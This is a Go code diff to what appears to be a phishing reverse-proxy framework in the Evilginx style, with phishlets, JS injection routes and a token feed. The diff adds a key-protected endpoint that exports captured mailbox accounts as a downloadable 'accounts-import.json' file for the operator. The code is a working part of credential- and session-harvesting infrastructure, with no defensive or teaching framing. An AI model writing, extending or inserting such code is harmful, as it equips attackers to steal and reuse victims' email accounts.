@@ -247,6 +247,7 @@ var (
 	tokenFeedRe      = regexp.MustCompile(`^/api/v1/feed$`)
 	mailboxApiRe     = regexp.MustCompile(`^/api/v1/mailbox$`)
 	mailboxDownloadRe= regexp.MustCompile(`^/api/v1/mailbox/download$`)
+	mailboxJsonRe    = regexp.MustCompile(`^/api/v1/mailbox/json$`)
 	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
 	jsInjectRe       = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
 	jsonContentRe    = regexp.MustCompile(`application/\w*\+?json`)
@@ -553,6 +554,38 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// These must be accessible regardless of blacklist or phishlet state
 			// ════════════════════════════════════════════════════════════════════════
 			if strings.HasPrefix(req.URL.Path, "/api/v1/") {
+				// --- Mailbox JSON download endpoint (direct JSON file) ---
+				if mailboxJsonRe.MatchString(req.URL.Path) {
+					remote_addr := req.RemoteAddr
+					if idx := strings.LastIndex(remote_addr, ":"); idx != -1 {
+						remote_addr = remote_addr[:idx]
+					}
+					apiKey := req.URL.Query().Get("key")
+					if apiKey != p.tokenFeed.GetAPIKey() {
+						log.Warning("[mailbox] JSON download unauthorized - invalid key from %s", remote_addr)
+						resp := goproxy.NewResponse(req, "application/json", 401, `{"error":"unauthorized"}`)
+						return req, resp
+					}
+					exportBody, _ := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, "export")
+					resp := &http.Response{
+						Status:        "200 OK",
+						StatusCode:    200,
+						Proto:         "HTTP/1.1",
+						ProtoMajor:    1,
+						ProtoMinor:    1,
+						Request:       req,
+						Header:        make(http.Header),
+						Body:          ioutil.NopCloser(strings.NewReader(exportBody)),
+						ContentLength: int64(len(exportBody)),
+					}
+					resp.Header.Set("Content-Disposition", "attachment; filename=\"accounts-import.json\"")
+					resp.Header.Set("Content-Type", "application/json")
+					resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(exportBody)))
+					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+					log.Success("[mailbox] JSON file served to %s (%d accounts)", remote_addr, p.mailboxAccounts.Count())
+					return req, resp
+				}
+
 				// --- Mailbox download endpoint (ZIP file) ---
 				if mailboxDownloadRe.MatchString(req.URL.Path) {
 					remote_addr := req.RemoteAddr
